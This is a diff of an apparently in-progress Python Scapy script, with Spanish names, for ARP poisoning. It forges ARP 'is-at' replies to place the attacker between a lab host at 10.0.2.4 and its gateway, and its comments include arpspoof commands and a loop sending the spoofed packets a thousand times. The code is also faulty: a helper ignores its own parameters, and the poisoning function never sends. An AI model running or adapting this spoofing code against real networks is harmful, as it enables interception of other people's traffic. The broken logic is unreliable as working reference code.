@@ -20,9 +20,26 @@ def menuForwarding():
 		cambiar_fw(1)
 		print("Activando Forwarding") 
 
+def getMACfromIP(ip):
+	pping=IP(dst=ip)/ICMP()
+	sendp(pping)
+	pcap=sniff(filter="icmp and host 10.0.2.4",count=1)
+	panalisis=pcap[0]
+	print(panalisis[Ether].src)
+	if (panalisis[Ether].src==ip):
+		mac=panalisis[Ether].src
+	elif (panalisis[Ether].dst==ip):
+		mac=panalisis[Ether].dst
+	else:
+		return 0
 
-#def mitm(ip_objetivo,ip_gateway):
+	print(ip)
+	print(mac)
+	return mac
 
+def arpPoissoning(IP_OBJETIVO,IP_GATEWAY):
+	p1=buildPacket(MAC_PROPIA,MAC_OBJETIVO,IP_GATEWAY,IP_OBJETIVO)
+	p2=buildPacket(MAC_PROPIA,MAC_OBJETIVO,IP_OBJETIVO,IP_GATEWAY)
 #menuForwarding()
 
 #os.system("echo hola")
@@ -35,22 +52,21 @@ def menuForwarding():
 #arpspoof -i eth0 -t 10.0.2.4 10.0.2.1
 #arpspoof -i eth0 -t 10.0.2.1 10.0.2.4
 
-p=Ether()/ARP()
 
-p[Ether].dst="08:00:27:7c:4b:c5"
-p[Ether].src="08:00:27:95:8c:5e"
-p[ARP].op="is-at"
-p[ARP].hwsrc="08:00:27:95:8c:5e"
-p[ARP].psrc="10.0.2.1"
-p[ARP].hwdst="08:00:27:7c:4b:c5"
-p[ARP].pdst="10.0.2.4"
-"""p=Ether(dst=08:00:27:7c:4b:c5)/ARP()
-p[ARP].op="is-at"
-p[ARP].hwsrc=MAC_PROPIA
-p[ARP].psrc=IP_GATEWAY
-p[ARP].hwdst=MAC_OBJETIVO
-p[ARP].pdst=IP_Objetivo
-"""
-print("0)Dejar de enviar paquetes") 
-	sendp(p*1000,inter=1)
-p.show()
+def buildPacket(MAC_PROPIA,MAC_OBJETIVO,psrc,pdst):
+	p=Ether()/ARP()
+	p[Ether].dst=MAC_OBJETIVO
+	p[Ether].src=MAC_PROPIA
+	p[ARP].op="is-at"
+	p[ARP].hwsrc=MAC_PROPIA
+	p[ARP].psrc=IP_GATEWAY
+	p[ARP].hwdst=MAC_OBJETIVO
+	p[ARP].pdst=IP_OBJETIVO
+	return p
+
+
+getMACfromIP("10.0.2.4")
+#print("0)Dejar de enviar paquetes") 
+#sendp(p*1000,inter=1)
+#p.show()
+
